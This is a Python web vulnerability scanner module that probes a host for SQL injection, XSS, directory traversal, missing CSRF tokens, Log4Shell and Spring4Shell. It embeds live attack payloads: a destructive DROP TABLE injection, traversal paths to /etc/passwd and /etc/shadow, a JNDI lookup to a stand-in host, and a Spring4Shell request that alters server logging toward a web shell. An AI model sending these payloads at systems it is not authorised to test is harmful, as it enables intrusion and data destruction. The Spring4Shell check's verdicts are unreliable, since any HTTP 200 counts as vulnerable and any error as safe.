"""
Web vulnerability scanner: SQLi, XSS, Directory Traversal,
CSRF, Log4Shell, Spring4Shell.
"""

import urllib.request
import urllib.error
import urllib.parse
import ssl
import re


# ─── HELPER ─────────────────────────────────────────────────────────────────

def _get(url, headers=None, timeout=5.0):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    h = {"User-Agent": "PortHawk/2.0"}
    if headers:
        h.update(headers)
    try:
        req = urllib.request.Request(url, headers=h)
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status, r.read(8192).decode(errors="ignore"), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, "", {}
    except Exception:
        return 0, "", {}

def _post(url, data, headers=None, timeout=5.0):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    h = {"User-Agent": "PortHawk/2.0", "Content-Type": "application/x-www-form-urlencoded"}
    if headers:
        h.update(headers)
    try:
        body = urllib.parse.urlencode(data).encode()
        req = urllib.request.Request(url, data=body, headers=h)
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status, r.read(8192).decode(errors="ignore")
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception:
        return 0, ""


# ─── SQL INJECTION ──────────────────────────────────────────────────────────

SQLI_PAYLOADS = [
    "'", "''", "`", "' OR '1'='1", "' OR 1=1--",
    "\" OR \"1\"=\"1", "1' ORDER BY 1--",
    "1' UNION SELECT NULL--", "' AND SLEEP(2)--",
    "1; DROP TABLE users--",
]

SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "ora-", "pg_query",
    "sqlite_", "sqlstate", "syntax error", "unclosed quotation",
    "you have an error in your sql", "warning: mysql",
    "division by zero", "supplied argument is not",
]

def check_sqli(host: str, port: int = 80, timeout: float = 5.0) -> dict:
    """Test for SQL injection vulnerabilities."""
    scheme = "https" if port in (443, 8443) else "http"
    base = f"{scheme}://{host}:{port}"
    found = []

    test_paths = ["/", "/search", "/login", "/products", "/index.php"]
    for path in test_paths:
        for payload in SQLI_PAYLOADS[:5]:
            url = f"{base}{path}?id={urllib.parse.quote(payload)}&q={urllib.parse.quote(payload)}"
            _, body, _ = _get(url, timeout=timeout)
            body_lower = body.lower()
            for err in SQLI_ERRORS:
                if err in body_lower:
                    found.append(f"SQLi at {path}?id={payload} → {err}")
                    break
        if found:
            break

    if found:
        return {"vuln": True, "detail": found[0]}
    return {"vuln": False, "detail": "No SQL injection found"}


# ─── XSS ────────────────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "'\"><script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
]

def check_xss(host: str, port: int = 80, timeout: float = 5.0) -> dict:
    """Test for reflected XSS vulnerabilities."""
    scheme = "https" if port in (443, 8443) else "http"
    base = f"{scheme}://{host}:{port}"
    found = []

    test_paths = ["/", "/search", "/index.php"]
    for path in test_paths:
        for payload in XSS_PAYLOADS[:3]:
            encoded = urllib.parse.quote(payload)
            url = f"{base}{path}?q={encoded}&search={encoded}"
            _, body, _ = _get(url, timeout=timeout)
            if payload.lower() in body.lower():
                found.append(f"XSS at {path}?q={payload[:30]}")
                break
        if found:
            break

    if found:
        return {"vuln": True, "detail": found[0]}
    return {"vuln": False, "detail": "No XSS found"}


# ─── DIRECTORY TRAVERSAL ────────────────────────────────────────────────────

TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../windows/win.ini",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

TRAVERSAL_SIGNS = ["root:x:", "[boot loader]", "daemon:", "bin/bash", "bin/sh"]

def check_traversal(host: str, port: int = 80, timeout: float = 5.0) -> dict:
    """Test for directory traversal vulnerabilities."""
    scheme = "https" if port in (443, 8443) else "http"
    base = f"{scheme}://{host}:{port}"

    params = ["file", "path", "page", "include", "doc", "filename"]
    for payload in TRAVERSAL_PAYLOADS[:3]:
        for param in params:
            url = f"{base}/?{param}={payload}"
            _, body, _ = _get(url, timeout=timeout)
            for sign in TRAVERSAL_SIGNS:
                if sign in body:
                    return {"vuln": True,
                            "detail": f"Directory traversal via ?{param}= → found '{sign}'"}
    return {"vuln": False, "detail": "No directory traversal found"}


# ─── CSRF ───────────────────────────────────────────────────────────────────

def check_csrf(host: str, port: int = 80, timeout: float = 5.0) -> dict:
    """Check for missing CSRF protection on forms."""
    scheme = "https" if port in (443, 8443) else "http"
    base = f"{scheme}://{host}:{port}"
    paths = ["/login", "/admin", "/register", "/contact", "/"]

    for path in paths:
        _, body, _ = _get(f"{base}{path}", timeout=timeout)
        if "<form" in body.lower():
            has_csrf = any(t in body.lower() for t in [
                "csrf", "_token", "authenticity_token",
                "nonce", "xsrf", "__requestverificationtoken"
            ])
            if not has_csrf:
                return {"vuln": True,
                        "detail": f"Form at {path} has no CSRF token"}
    return {"vuln": False, "detail": "CSRF tokens found or no forms detected"}


# ─── LOG4SHELL ──────────────────────────────────────────────────────────────

def check_log4shell(host: str, port: int = 80, timeout: float = 5.0) -> dict:
    """
    Check for Log4Shell CVE-2021-44228.
    Note: Real detection needs a callback server (e.g. interactsh).
    This checks if the payload passes through without being stripped.
    """
    scheme = "https" if port in (443, 8443) else "http"
    url = f"{scheme}://{host}:{port}/"
    payload = "${jndi:ldap://log4shell.test/a}"
    headers = {
        "X-Api-Version": payload,
        "User-Agent": payload,
        "X-Forwarded-For": payload,
        "Referer": payload,
    }
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read(1024).decode(errors="ignore")
            if "${jndi:" in body:
                return {"vuln": True,
                        "detail": "Log4Shell payload reflected — POSSIBLY VULNERABLE (CVE-2021-44228)"}
    except Exception:
        pass
    return {"vuln": False,
            "detail": "Log4Shell payload not reflected (use interactsh for full test)"}


# ─── SPRING4SHELL ───────────────────────────────────────────────────────────

def check_spring4shell(host: str, port: int = 80, timeout: float = 5.0) -> dict:
    """Check for Spring4Shell CVE-2022-22965."""
    scheme = "https" if port in (443, 8443) else "http"
    url = f"{scheme}://{host}:{port}/"
    headers = {
        "suffix": "%>//",
        "c1": "Runtime",
        "c2": "<%",
        "DNT": "1",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    payload = (
        "class.module.classLoader.resources.context.parent"
        ".pipeline.first.pattern=%25%7Bc2%7Di%20"
        "if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B"
    )
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        data = payload.encode()
        req = urllib.request.Request(url, data=data, headers=headers, method="POST")
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            if r.status == 200:
                return {"vuln": True,
                        "detail": "Spring4Shell probe succeeded — verify manually (CVE-2022-22965)"}
    except Exception:
        pass
    return {"vuln": False, "detail": "Not vulnerable to Spring4Shell"}


# ─── RUNNER ─────────────────────────────────────────────────────────────────

def run_web_vuln_scan(host: str, open_ports: list) -> list:
    """Run all web vulnerability checks on HTTP/HTTPS ports."""
    findings = []
    web_ports = [p.port for p in open_ports if p.port in (80, 443, 8080, 8443, 8000)]

    if not web_ports:
        return findings

    checks = [
        ("SQL Injection",       check_sqli),
        ("XSS",                 check_xss),
        ("Directory Traversal", check_traversal),
        ("CSRF",                check_csrf),
        ("Log4Shell",           check_log4shell),
        ("Spring4Shell",        check_spring4shell),
    ]

    for port in web_ports:
        for name, fn in checks:
            try:
                result = fn(host, port)
                findings.append({
                    "name": name,
                    "port": port,
                    "vuln": result["vuln"],
                    "detail": result["detail"],
                })
            except Exception as e:
                findings.append({
                    "name": name,
                    "port": port,
                    "vuln": False,
                    "detail": f"Error: {e}",
                })

    return findings
